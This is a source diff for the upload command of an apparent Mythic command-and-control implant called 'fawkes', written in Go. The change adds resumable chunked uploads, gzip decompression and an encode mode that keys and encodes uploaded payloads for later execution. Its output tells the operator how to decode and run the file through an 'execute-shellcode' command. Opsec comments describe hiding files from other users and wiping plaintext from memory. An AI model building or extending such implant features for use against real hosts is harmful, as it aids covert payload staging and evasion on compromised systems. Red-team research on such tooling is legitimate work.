@@ -1,11 +1,12 @@
 package commands
 
 import (
-	"encoding/json"
+	"fmt"
 	"os"
 	"path/filepath"
 	"strings"
 
+	"fawkes/pkg/files"
 	"fawkes/pkg/structs"
 )
 
@@ -27,15 +28,15 @@ type UploadArgs struct {
 	FileID     string `json:"file_id"`
 	RemotePath string `json:"remote_path"`
 	Overwrite  bool   `json:"overwrite"`
+	Decompress bool   `json:"decompress"`
+	Encode     string `json:"encode"`
 }
 
 // Execute executes the upload command
 func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
-	args := UploadArgs{}
-
-	err := json.Unmarshal([]byte(task.Params), &args)
-	if err != nil {
-		return errorf("Failed to parse arguments: %v", err)
+	args, parseErr := unmarshalParams[UploadArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 
 	// Handle tilde expansion
@@ -52,32 +53,77 @@ func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
 		return errorf("Failed to resolve absolute path for %s: %v", fixedFilePath, err)
 	}
 
+	encoding := args.Encode
+	if encoding == "none" {
+		encoding = ""
+	}
+
+	// Encode mode: accumulate all data, encode, write once
+	if encoding != "" {
+		return c.executeEncoded(task, fullPath, args, encoding)
+	}
+
+	// For decompress mode, write to a temp path first, then decompress to final path
+	writePath := fullPath
+	if args.Decompress {
+		writePath = fullPath + ".gz.tmp"
+		defer os.Remove(writePath) // Clean up temp file
+	}
+
+	// Check for an existing partial upload that can be resumed
+	startChunk := 1
+	resuming := false
+	if !args.Decompress { // Resume only supported for direct writes (not decompress mode)
+		existingState := files.GetTransferState(fullPath, files.TransferUpload)
+		if existingState != nil && existingState.FileID == args.FileID {
+			resuming = true
+			startChunk = existingState.LastChunk + 1
+		}
+	}
+
 	// Set up the file transfer request
+	tfResult := &structs.FileTransferResult{}
 	r := structs.GetFileFromMythicStruct{}
 	r.FileID = args.FileID
 	r.FullPath = fullPath
 	r.Task = &task
 	r.SendUserStatusUpdates = true
-	totalBytesWritten := 0
+	r.TransferResult = tfResult
+	r.StartChunk = startChunk
 
 	// Check if file exists
 	_, err = os.Stat(fullPath)
 	fileExists := err == nil
 
-	if fileExists && !args.Overwrite {
+	if fileExists && !args.Overwrite && !resuming {
 		return errorf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath)
 	}
 
-	// Open file for writing — truncate if overwriting, create if new
-	// Use 0700 permissions: owner rwx only (opsec — prevent other users from reading/executing)
-	fp, err := os.OpenFile(fullPath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0700)
-	if err != nil {
-		return errorf("Failed to open %s for writing: %v", fullPath, err)
+	// Open file for writing:
+	// - Resume: append mode (no truncate), seek to current file size
+	// - Normal: truncate to start fresh
+	var fp *os.File
+	if resuming {
+		fp, err = os.OpenFile(writePath, os.O_RDWR|os.O_CREATE, 0700)
+		if err != nil {
+			return errorf("Failed to open %s for resume: %v", writePath, err)
+		}
+		// Seek to end of existing partial content
+		if _, seekErr := fp.Seek(0, 2); seekErr != nil {
+			fp.Close()
+			return errorf("Failed to seek to end of %s: %v", writePath, seekErr)
+		}
+	} else {
+		fp, err = os.OpenFile(writePath, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0700)
+		if err != nil {
+			return errorf("Failed to open %s for writing: %v", writePath, err)
+		}
 	}
 	defer fp.Close() // Safety net: ensure fd is closed even if transfer goroutine panics
 	r.ReceivedChunkChannel = make(chan []byte)
 	task.Job.GetFileFromMythic <- r
 
+	totalBytesWritten := 0
 	var writeErr error
 	for {
 		newBytes := <-r.ReceivedChunkChannel
@@ -97,12 +143,84 @@ func (c *UploadCommand) Execute(task structs.Task) structs.CommandResult {
 	}
 
 	if writeErr != nil {
-		return errorf("Error writing to %s after %d bytes: %v", fullPath, totalBytesWritten, writeErr)
+		return errorf("Error writing to %s after %d bytes: %v", writePath, totalBytesWritten, writeErr)
 	}
 
 	if task.DidStop() {
 		return errorResult("Task stopped early")
 	}
 
-	return successf("Uploaded %d bytes to %s", totalBytesWritten, fullPath)
+	// Handle decompression if requested
+	if args.Decompress {
+		hash, decompBytes, decompErr := files.DecompressFileGzip(writePath, fullPath)
+		if decompErr != nil {
+			return errorf("Error decompressing file: %v", decompErr)
+		}
+		return successf("Uploaded and decompressed to %s\nCompressed: %s → Decompressed: %s\nDecompressed SHA256: %s",
+			fullPath,
+			formatFileSize(int64(totalBytesWritten)),
+			formatFileSize(decompBytes),
+			hash)
+	}
+
+	// Build output with hash info
+	var output string
+	if resuming {
+		output = fmt.Sprintf("Resumed upload: wrote %d new bytes to %s (started at chunk %d)",
+			totalBytesWritten, fullPath, startChunk)
+	} else {
+		output = fmt.Sprintf("Uploaded %d bytes to %s", totalBytesWritten, fullPath)
+	}
+	if tfResult.SHA256 != "" {
+		output += fmt.Sprintf("\nSHA256 (transferred portion): %s", tfResult.SHA256)
+	}
+	return successResult(output)
+}
+
+func (c *UploadCommand) executeEncoded(task structs.Task, fullPath string, args UploadArgs, encoding string) structs.CommandResult {
+	_, err := os.Stat(fullPath)
+	if err == nil && !args.Overwrite {
+		return errorf("File %s already exists. Reupload with the overwrite parameter, or remove the file before uploading again.", fullPath)
+	}
+
+	r := structs.GetFileFromMythicStruct{}
+	r.FileID = args.FileID
+	r.FullPath = fullPath
+	r.Task = &task
+	r.SendUserStatusUpdates = true
+	r.TransferResult = &structs.FileTransferResult{}
+	r.ReceivedChunkChannel = make(chan []byte)
+	task.Job.GetFileFromMythic <- r
+
+	var allData []byte
+	for {
+		chunk := <-r.ReceivedChunkChannel
+		if len(chunk) == 0 {
+			break
+		}
+		allData = append(allData, chunk...)
+	}
+
+	if task.DidStop() {
+		return errorResult("Task stopped early")
+	}
+
+	originalSize := len(allData)
+	encoded, keyHex, encErr := encodeData(allData, encoding)
+	for i := range allData {
+		allData[i] = 0
+	}
+	if encErr != nil {
+		return errorf("Encoding failed: %v", encErr)
+	}
+
+	if writeErr := os.WriteFile(fullPath, encoded, 0700); writeErr != nil {
+		return errorf("Failed to write encoded file to %s: %v", fullPath, writeErr)
+	}
+
+	return successf("Uploaded and encoded %s to %s\nOriginal: %s → Encoded: %s\nEncoding: %s\nKey: %s\nDecode: execute-shellcode -encoding %s -key %s",
+		encoding, fullPath,
+		formatFileSize(int64(originalSize)),
+		formatFileSize(int64(len(encoded))),
+		encoding, keyHex, encoding, keyHex)
 }
